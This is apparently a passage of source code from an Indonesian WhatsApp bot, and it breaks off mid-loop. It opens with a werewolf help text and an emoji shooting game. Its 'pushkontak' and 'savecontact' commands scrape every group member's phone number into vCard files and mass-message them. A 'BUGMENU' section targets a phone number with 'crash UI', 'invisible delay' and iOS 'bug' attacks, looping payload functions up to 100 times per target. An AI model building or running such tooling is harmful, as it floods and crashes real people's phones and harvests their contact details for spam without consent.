                    let text = `\n*W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*C O M M A N D*\n`;
                    text += ` • ww create\n`;
                    text += ` • ww join\n`;
                    text += ` • ww start\n`;
                    text += ` • ww exit\n`;
                    text += ` • ww delete\n`;
                    text += ` • ww player\n`;
                    text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
                    zuu.sendMessage(
                        m.chat, {
                            text: text.trim(),
                            contextInfo: {
                                externalAdReply: {
                                    title: "W E R E W O L F",
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    thumbnail: await resize(thumb, 300, 175),
                                    sourceUrl: `${global.saluran}`,
                                    mediaUrl: thumb,
                                },
                            },
                        }, {
                            quoted: fsaluran
                        }
                    );
                }
            }
            break
            case 'koboy':
            case "tembak":
            case "←":
            case "→":
            case "Tembak": {
                function random(arr) {
                    return arr[Math.floor(Math.random() * arr.length)];
                }


                try {

                    zuu.tembak = zuu.tembak || {
                        musuh: [],
                        tembak: []
                    };

                    if (/←/i.test(command)) {
                        let kiri = [
                            ["🤠", "-", "-", "-", "-"],
                            ["-", "🤠", "-", "-", "-"],
                            ["-", "-", "🤠", "-", "-"],
                            ["-", "-", "-", "🤠", "-"],
                            ["-", "-", "-", "-", "🤠"]
                        ];

                        if (zuu.tembak.tembak.indexOf("🤠") == 0) {
                            zuu.tembak.tembak = kiri[0];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 1) {
                            zuu.tembak.tembak = kiri[0];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 2) {
                            zuu.tembak.tembak = kiri[1];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 3) {
                            zuu.tembak.tembak = kiri[2];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 4) {
                            zuu.tembak.tembak = kiri[3];
                        }

                        let pos = zuu.tembak.musuh.join(" ") + "\n\n\n" + zuu.tembak.tembak.join(" ");

                        if (zuu.tembak.musuh.indexOf("🥷") === zuu.tembak.tembak.indexOf("🤠")) {
                            return zuu.sendPoll(m.chat, pos, ['tembak', 'Tembak']);
                        }

                        return zuu.sendPoll(m.chat, pos, ['←', '→']);
                    } else if (/→/i.test(command)) {
                        let kanan = [
                            ["🤠", "-", "-", "-", "-"],
                            ["-", "🤠", "-", "-", "-"],
                            ["-", "-", "🤠", "-", "-"],
                            ["-", "-", "-", "🤠", "-"],
                            ["-", "-", "-", "-", "🤠"]
                        ];

                        if (zuu.tembak.tembak.indexOf("🤠") == 0) {
                            zuu.tembak.tembak = kanan[1];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 1) {
                            zuu.tembak.tembak = kanan[2];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 2) {
                            zuu.tembak.tembak = kanan[3];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 3) {
                            zuu.tembak.tembak = kanan[4];
                        } else if (zuu.tembak.tembak.indexOf("🤠") == 4) {
                            zuu.tembak.tembak = kanan[4];
                        }

                        let pos = zuu.tembak.musuh.join(" ") + "\n\n\n" + zuu.tembak.tembak.join(" ");

                        if (zuu.tembak.musuh.indexOf("🥷") === zuu.tembak.tembak.indexOf("🤠")) {
                            return zuu.sendPoll(m.chat, pos, ['tembak', 'Tembak']);
                        }

                        return zuu.sendPoll(m.chat, pos, ['←', '→']);
                    } else if (/tembak/i.test(command)) {
                        if (zuu.tembak.tembak.indexOf("🤠") == zuu.tembak.musuh.indexOf("🥷")) {
                            zuu.tembak = {};
                            global.db.users[m.sender].bits += 1000;
                            reply("Kamu menang!\n\nBits + 1000");
                        }
                    } else {
                        let randMusuh = [
                            ["🥷", "-", "-", "-", "-"],
                            ["-", "🥷", "-", "-", "-"],
                            ["-", "-", "🥷", "-", "-"],
                            ["-", "-", "-", "🥷", "-"],
                            ["-", "-", "-", "-", "🥷"]
                        ];
                        let randAku = [
                            ["🤠", "-", "-", "-", "-"],
                            ["-", "🤠", "-", "-", "-"],
                            ["-", "-", "🤠", "-", "-"],
                            ["-", "-", "-", "🤠", "-"],
                            ["-", "-", "-", "-", "🤠"]
                        ];

                        let musuh = random(randMusuh);
                        let aku = random(randAku);

                        zuu.tembak.musuh = musuh;
                        zuu.tembak.tembak = aku;

                        let pos = zuu.tembak.musuh.join(" ") + "\n\n\n" + zuu.tembak.tembak.join(" ");

                        if (zuu.tembak.musuh.indexOf("🥷") === zuu.tembak.tembak.indexOf("🤠")) {
                            return zuu.sendPoll(m.chat, pos, ['tembak', '←', '→'])
                        }

                        return zuu.sendPoll(m.chat, pos, ['←', '→']);
                    }
                } catch (e) {
                    throw false;
                }
            }
            break
            //=============[ Common - Feature ]=================//
            case "cekidgc": case "listgroup": {
if (!isCreator) return reply(mess.owner)
let getGroups = await zuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `*${X}[ LIST GROUP DI BAWAH ]${X}*\n\nSaya Tambahkan .id agar tes dapat tersalin, id group hanya berupa nomor`



for (let x of anu) {
let metadata2 = await zuu.groupMetadata(x)
const idnyahrooo = metadata2.id
teks += `\n•─ ─────────── ─•
⟡ Nama : ${metadata2.subject}
⟡ ID : ${idnyahrooo}
⟡ Member : ${metadata2.participants.length}
•─ ─────────── ─•\n`
}
reply(teks)
}
break
case "pushkontakv1":{
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Kusus di Chat Pribadi")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text.split("|")[0]}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ptz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ptz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(m.chat, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isCreator) return reply(mess.owner)
if (!isGroup) return reply("Khusus Di Group")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGroup? await zuu.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
}, 2100)
} else {
setTimeout(async () => {
zuu.sendMessage(men, { text: global.tekspushkonv2 })
}, 2100)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
const groupMetadataax = !isGroup? await zuu.groupMetadata(`${q.split("|")[0]}@g.us`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataax.participants : ""
const haxlls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of haxlls) {
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
}, q.split("|")[1])

} else {
setTimeout(async () => {
zuu.sendMessage(mem, { text: global.tekspushkonv3 })
}, q.split("|")[1])
}
}
reply(mess.done)
}
break
case "pushkontakv4": {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return reply(mess.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
}, text.split("|")[0])
} else {
setTimeout(async () => {
await zuu.sendMessage(men, { text: global.tekspushkonv4 })
}, text.split("|")[0])
}
}
}
reply(mess.done)
break
case "savecontactv1": {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return reply(mess.group)

const groupMetadata = isGroup? await zuu.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak': {
if (!isPremium) return reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
huhuhs = await zuu.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*\n\nSending contact...`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) 
zuu.sendContact(m.chat, participants.map(a => a.id), huhuhs)
}
break
case 'savekontak': case 'svkontak': {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
let cmiggc = await zuu.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './lib/database/contacts.vcf'
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
zuu.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
}
break
case 'sendkontak': case 'kontak': {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
if (!m.mentionedJid[0]) return reply('Example: .kontak @tag|nama')
let snTak = text.split('|')[1] ? text.split('|')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split("@")[0]+":"+m.mentionedJid[0].split("@")[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
}
zuu.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case "savecontactv2": {
if (!isCreator) return reply(mess.owner)
if (isGroup) return reply(mess.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await zuu.groupMetadata(`${text}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(m.chat, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
    
//===== BUGMENU ====== //
case "xoutplace": 
    if (!isCreator) return reply(mess.owner);
    if (!q) return reply(`<爕> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .XOUTPLACE 62XX`);
    
    let incTarget = q.replace(/[^0-9]/g, '');
    if (incTarget.startsWith('0')) return reply(`<爕> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : . XOUTPLACE62XX`);
    let target = incTarget + '@s.whatsapp.net';

                const xteg = `𝚃𝚊𝚛𝚐𝚎𝚝 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚘𝚗 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚜𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚋𝚞𝚐 𝚖𝚎𝚗𝚞 𝚋𝚎𝚕𝚘𝚠:`

let b = [
        { buttonId: ".creator", buttonText: { displayText: "̋͢𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ᝄ" } },
        { buttonId: ".allmenu", buttonText: { displayText: "̋͢𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 ᝄ" } }, 
        { buttonId: ".tqto", buttonText: { displayText: "̋͢𝐃𝐄𝐂𝐒𝐑𝐈𝐏𝐓𝐈𝐎𝐍 𝐀𝐍𝐃 𝐓𝐐𝐓𝐎 ᝄ" } }
    ];
    
           let jem = {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.jpegfile,
                    mimetype: 'image/jpg',
                    jpegThumbnail: fs.readFileSync("./assets/Gallery/doc4.jpg"),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl2,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: 101,
                            newsletterName: global.nems
                        },
                    },
                    caption: xteg,
                    footer: nems,
                    buttons: b,
                    headerType: 6,
                    viewOnce: true
                };
                
        const FA = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: `⾼ \` 𝐒𝐄𝐋𝐄𝐂𝐓 𝐁𝐔𝐆 \``,
                sections: [
                        {
            title: '𖥂 𝟑𝐂𝐎𝐌𝐁𝐎 𝐁𝐔𝐆 𝐓𝐑𝐀𝐒𝐇 𝐃𝐄𝐋𝐀𝐘 ᝄ',            
            rows: [               
                {
                    title: '▢ 𝐃𝐄𝐋𝐀𝐘 ☇ 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐖𝐀 𝐎𝐑𝐈',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}invsdlyori ${incTarget}`
                },
                {
                    title: '▢ 𝐃𝐄𝐋𝐀𝐘 ☇ 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐖𝐀 𝐁𝐄𝐓𝐀',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}invsdlybeta ${incTarget}`
                }
            ]
        },
        {
            title: '𖥂 𝐗𝐓𝐑𝐀𝐒𝐇 𝐁𝐄𝐓𝐀 𝐍𝐄𝐖 ᝄ',            
            rows: [
                {
                    title: '▢ 𝐃𝐄𝐋𝐀𝐘 ☇ 𝐇𝐀𝐑𝐃',                   
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}invsdlyhard ${incTarget}`
                },
                {
                    title: '▢ 𝐃𝐄𝐋𝐀𝐘 ☇ 𝐌𝐄𝐃𝐈𝐔𝐌',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}invsdlymedium ${incTarget}`
                },
                {
                    title: '▢ 𝐃𝐄𝐋𝐀𝐘 ☇ 𝐄𝐀𝐒𝐘',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}invsdlyeasy ${incTarget}`
                }
            ]
        },
        {
            title: '𖥂 𝐗𝐓𝐑𝐀𝐒𝐇 𝐔𝐈 ᝄ',
            rows: [
                {
                    title: '▢ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 ☇ 𝐓𝐑𝐀𝐒𝐗',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}crashui ${incTarget}`
                },
                {
                    title: '▢ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 ☇ 𝐕𝐎𝐈𝐃',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}crashui2 ${incTarget}`
                },
                {
                    title: '▢ 𝐂𝐑𝐀𝐒𝐇 𝐔𝐈 ☇ 𝐁𝐑𝐄𝐀𝐊𝐄𝐑',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}crashui3 ${incTarget}`
                }
            ]
        },
        {
            title: '𖥂 𝐗𝐓𝐑𝐀𝐒𝐇 𝐅𝐎𝐑 𝐈𝐏𝐇𝐎𝐍𝐄 ᝄ',
            rows: [
            {
                   title: '▢ 𝐈𝐎𝐒 ☇ 𝐔𝐋𝐓𝐑𝐀',
                   description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                   id: `${prefix}invsiosui ${incTarget}`
               },
               {
                   title: '▢ 𝐈𝐎𝐒 ☇ 𝐁𝐑𝐄𝐀𝐊𝐄𝐑',
                   description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                   id: `${prefix}invsiosui2 ${incTarget}`
            },
            ]
        },
        { 
            title: '𖥂 𝐗𝐓𝐑𝐀𝐒𝐇 𝐂𝐇𝐀𝐍𝐍𝐄𝐋ᝄ',
            rows: [
                {
                    title: '▢ 𝐂𝐑𝐀𝐒𝐇 ☇ 𝐓𝐎 ☇ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋',
                    description: `ᝄ 𝐎.𝐋.𝐕 𝐗`,
                    id: `${prefix}crashch ${incTarget}`
                },
            ]
        },
        ]
            })
        },
        viewOnce: true
    };

    jem.buttons.push(FA);
    
    await zuu.sendMessage(m.chat, jem, { quoted: fsaluran });       
                break

// ==== BUG ====//
case 'invsdlyori': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYORI 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝗖𝗢𝗠𝗕𝗢 - 𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟲ᯭ͢𝟲᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYORI 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await delayinvis(target)
        await sleep(2000)
        await delayinvis2(target)
        await sleep(2000)
        await delayinvis3(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break

case 'invsdlybeta': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYBETA 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟮ᯭ͢𝟲᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYBETA 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await prokontol(target)
        await sleep(2000)
    }
    await sleep(1000);
    await m.reply(`\`🜛 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐀𝐑𝐆𝐄𝐓 : \`${target.split("@")[0]}\`
▢↯ 𝐕𝐈𝐑𝐔𝐒 : \`${virusNames[command]}🦠\`
▢↯ 𝐈𝐓𝐄𝐌 𝐏𝐀𝐘 : \`${angkanya[command]}\`
┏────᚜「 ⾼ 」
┗─ \`𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗖𝗿𝗶𝘁𝗶𝗰𝗮𝗹 𝗕𝘂𝗴 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›`);
}
break
case 'invsdlyhard': {
  if (!isCreator) return reply(mess.owner);
  if (!q) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYHARD 𝟲𝟮𝗫𝗫`);
  
  const virusNames = {
    'combox': '𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦 𝗛𝗔𝗥𝗗'
  };

  const angkanya = {
    'combox': ' ᭄͢𝐙𝐔͢𝐔ᯭ𝐎𝐁᭳ᝄ𝐋𝐈𝐕ᯭ͢𝐈𝐎͢𝐍᭳ᝄ𝐗𝟮ᯭ͢𝟖᭄'
  };
  
  let incTarget = q.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return reply(`<!> 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : .INVSDLYHARD 𝟲𝟮𝗫𝗫`);

  let target = `${incTarget}@s.whatsapp.net`;
  
 await reply(`
\`▢↯ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒 ᝄ🐉\`

▢↯ 𝐓𝐈𝐌𝐄 : ${ucapanWaktu} ${time2}
▢↯ 𝐃𝐀𝐘 : ${hariini}
┏────᚜「 ⾼ 」
┗─ \`𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 𝘁𝗼 𝗧𝗮𝗿𝗴𝗲𝘁\`

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹ᝄ›

© ⿻ᬃ𝐙𝐔͢𝐔𝐎ᯭ𝐁𝐋𝐈͢𝐕ᯭ͢𝐈𝐎͢𝐍ᝄ𝐗᭭⿻`);

    for (let r = 0; r < 100; r++) {
        await bulldozer(target)
